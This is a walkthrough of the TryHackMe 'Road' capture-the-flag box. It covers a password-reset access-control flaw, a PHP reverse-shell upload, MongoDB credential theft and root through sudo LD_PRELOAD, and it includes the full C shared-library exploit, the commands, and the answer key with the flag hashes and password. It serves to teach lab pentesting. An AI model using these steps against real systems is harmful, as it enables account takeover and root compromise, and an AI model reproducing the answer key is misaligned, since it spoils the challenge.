# Road

{% embed url="https://tryhackme.com/room/road" %}

Medium Linux box. The attack chain hits broken access control in a profile update function → unrestricted file upload as admin → MongoDB credential leak → LD\_PRELOAD sudo escalation.

---

## Recon

```bash
nmap -sC -sV -T4 MACHINE_IP
```

Open ports:
- **22** — OpenSSH 8.2p1
- **80** — Apache 2.4.41 (*Sky Couriers* shipping web app)
- **27017** — MongoDB (localhost only, found later)

---

## Web Enumeration

Navigate to `http://MACHINE_IP`. There's a *Merchant Central* login. Register a new account and log in. Inside the profile/dashboard the admin email is leaked:

```
admin@sky.thm
```

---

## Broken Access Control → Admin Takeover

Go to the **Reset Password** page and intercept the request in Burp Suite. The form sends the current user's email. Change it to `admin@sky.thm` and forward the request — you've just reset the admin's password to whatever you supplied.

Log in as `admin@sky.thm` with your new password. The admin panel now unlocks a **profile picture upload** feature that regular users don't get.

---

## File Upload → Reverse Shell

Grab a PentestMonkey PHP reverse shell and upload it as the profile photo. If `.php` is blocked, rename it `.php5`. Start a listener:

```bash
nc -lvnp 4444
```

Browse to the uploaded file path (usually `/v2/admin/uploaded_images/`) and catch the shell. Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

We land as `www-data`.

---

## MongoDB → Lateral Movement

Check internal services:

```bash
netstat -tulnp
```

MongoDB is running on `127.0.0.1:27017`. Drop into it:

```bash
mongo
show dbs
use backup
show collections
db.user.find()
```

We get credentials for `webdeveloper`:

```
username: webdeveloper
password: BahamasChapp123!@#
```

Switch user:

```bash
su webdeveloper
# password: BahamasChapp123!@#
cat /home/webdeveloper/user.txt
```

---

## Privilege Escalation — LD_PRELOAD

```bash
sudo -l
```

Output shows `webdeveloper` can run `/usr/bin/sky_backup_utility` as root with `env_keep+=LD_PRELOAD`. Classic LD\_PRELOAD trick.

Write a shared library that spawns a shell:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile it:

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

Root shell. Grab the flag:

```bash
cat /root/root.txt
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| user.txt | `63191e4ece37523c9fe6bb62a5e64d45` |
| root.txt | `3a62d897c40a815ecbe267df2f533ac6` |
| MongoDB username found | `webdeveloper` |
| MongoDB password found | `BahamasChapp123!@#` |
